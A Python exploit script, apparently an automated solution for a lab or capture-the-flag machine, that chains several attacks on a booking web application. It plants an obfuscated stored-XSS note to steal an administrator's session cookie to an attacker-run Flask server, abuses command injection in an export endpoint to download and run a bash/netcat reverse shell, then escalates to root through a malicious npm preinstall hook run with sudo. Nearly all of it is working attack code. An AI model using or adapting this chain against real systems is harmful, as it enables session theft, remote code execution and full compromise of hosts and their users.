#!/usr/bin/python3
import argparse, flask, base64, contextlib, ipaddress, re, requests, socket, sys, threading, time, logging, click

parser = argparse.ArgumentParser()
parser.add_argument('RHOST',help='Remote host')
parser.add_argument('RPORT',help='Remote port')
parser.add_argument('LHOST',help='Local IP address for reverse shell payload')
parser.add_argument('LPORT',help='Local port for reverse shell payload')
args = parser.parse_args()

LHOST = args.LHOST
LPORT = args.LPORT
RHOST = args.RHOST
RPORT = args.RPORT
URLBASE = "http://"+RHOST+":"+str(RPORT)+"/"

XJS = """req1 = new XMLHttpRequest();
req1.open("GET","http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65",false);
req1.send();
req2 = new XMLHttpRequest();
req2.open("GET","http://"""+LHOST+"""/leak?x="+encodeURIComponent(btoa(req1.responseText)),false);
req2.send();
"""
RS = """#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc """+LHOST+" "+str(LPORT)+" >/tmp/f"

#Configure and start web server
app = flask.Flask("Evil web server")

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

click.secho = lambda a,**styles : a
click.echo = lambda a,**styles : a

@app.route('/x.js', methods=['GET'])
def xjs():
    print(" * Sending reverse JavaScript payload")
    return flask.Response(XJS, mimetype='application/javascript')

@app.route('/rs', methods=['GET'])
def rs2():
    print(" * Sending reverse shell payload")
    return flask.Response(RS, mimetype='application/octet-stream')

@app.route('/leak', methods=['GET'])
def leak():
    global cookieValue
    b = base64.b64decode(flask.request.args.get('x'))
    m = re.search("""name=\"cookie" value=\"connect.sid&#x3D;(.*?)\">""",str(b)) #Search base64 decoded string
    cookieValue = m.group(1)
    print(" * Admin session cookie successfully leaked: " + cookieValue)
    wsMutex.release()

    return "OK"

def startFlask():
    app.run(host=LHOST, port=80)

#Start the web server to serve x.js and leak the admin's session cookie
wsMutex = threading.Lock()
wsMutex.acquire()
webserverThread = threading.Thread(target=startFlask)
webserverThread.start()

#Send a login request
data = {"username":"RickA","password":"nevergonnagiveyouup"}
headers = {"User-Agent":"Linux"}
r = requests.post(URLBASE+"login", data=data, headers=headers, allow_redirects=False)
cookie = r.headers['set-cookie']

#Get the session cookie from the response
m = re.search("connect\.sid=(.*?);",cookie)
cookieName = "connect.sid"
cookieValue = m.group(1)

#Send a request for the /agent page to get a booking ID
headers['Cookie'] = cookieName+"="+cookieValue
r = requests.get(URLBASE+"agent", headers=headers)
BookingID = re.search("""href=\"/vac/([0-9,a-z,\-]*)\">""",r.text).group(1)

#Send an evil note that will request x.js from the web server
print(" * Sending XSS payload")
payload = """document.write('<script src="http://"""+LHOST+"""/x.js"></script>')"""
nums = [str(ord(i)) for i in payload]
payload = '<img src="x/><script>eval(String.fromCharCode('+','.join(nums)+'));</script>">'
data = {"uuid":BookingID,"body":payload}
r = requests.post(URLBASE+"agent/addNote", headers=headers, data=data)

#Wait for the admin session cookie before proceeding
print(" * Waiting for the administrator to browse the infected note")
wsMutex.acquire()
headers['Cookie'] = cookieName+"="+cookieValue

# executeRevShell - Executes a reverse shell on the target by abusing the command injection vulnerability
# Params:
#   urlbase - The URL of the target to compromise
#   wsIP - IP of the webserver which hosts the reverse shell payload "rs"
#   mutex(opt) - A mutex to acquire before exploiting the target
#   headers(opt) - Headers to send with the command injection attempts
def executeRevShell(urlbase, wsIP, mutex=None,headers={}):
    if mutex!=None:
        mutex.acquire()

    #convert Ip to dec format
    ipDec = int(ipaddress.ip_address(wsIP))

    print(" * Instructing the target to download the rs payload")
    with contextlib.suppress(requests.exceptions.ReadTimeout):
        requests.get(urlbase+"admin/export?table=x%26wget%20"+str(ipDec)+"%2frs", headers=headers, timeout=0.5)
        requests.get(urlbase+"admin/export?table=x%26bash%20rs", headers=headers, timeout=0.5)

#listener - Creates a listener which can catch a reverse shell
#Params:
#   ip - IP address to listen on
#   port - Port to listen on
#   commands(opt) - Commands to execute before creating an interactive shell
#   lock(opt) - A mutex to release after binding to the specified ip and port
def listener(ip,port,commands=[],mutex=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print(" * Listening on port " + str(port))
    if mutex != None:
        mutex.release()

    conn, addr = s.accept()
    print(' * Connection received from ',addr)
    defaultSleepTime = 1 #Time to wait for command output before returning, Measured in seconds
    sleepTime = defaultSleepTime
    while True:

        #Receive data from the target and execute commands
        ans = conn.recv(1024).decode()
        if commands:
            command = commands[0]
            commands = commands[1:]
            if not commands: #If this command is the last command
                sleepTime = 4 #Wait 4 seconds to ensure that all commands have been fully exectued before getting their output
        else:
            sys.stdout.write(ans)
            command = input()
            #Remove the output of the "input()" function
            sys.stdout.write("\033[A\033[F"+ans.split("\n")[-1])

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(sleepTime) #Wait a second before retreiving the output of the command
        sleepTime = defaultSleepTime

rsMutex = threading.Lock()
rsMutex.acquire()
rsThread = threading.Thread(target=executeRevShell,args=(URLBASE,LHOST,rsMutex,headers))
rsThread.start()

#Prepare a list with privesc commands and start a listener
#cat package.json | base64 -w 0
packageJSON = "ewogICJuYW1lIjogInByaXZlc2NQYWNrYWdlIiwKICAidmVyc2lvbiI6ICIxLjAuMCIsCiAgIm1haW4iOiAiaW5kZXguanMiLAogICJzY3JpcHRzIjogewogICAgInByZWluc3RhbGwiOiAiL2Jpbi9iYXNoIC1pIgogIH0KfQo="
privescCommands = ["mkdir ./privescPackage","echo '" + packageJSON + "' | base64 -d > privescPackage/package.json","sudo npm i privescPackage --unsafe"]
listener(LHOST,int(LPORT),privescCommands,mutex=rsMutex)
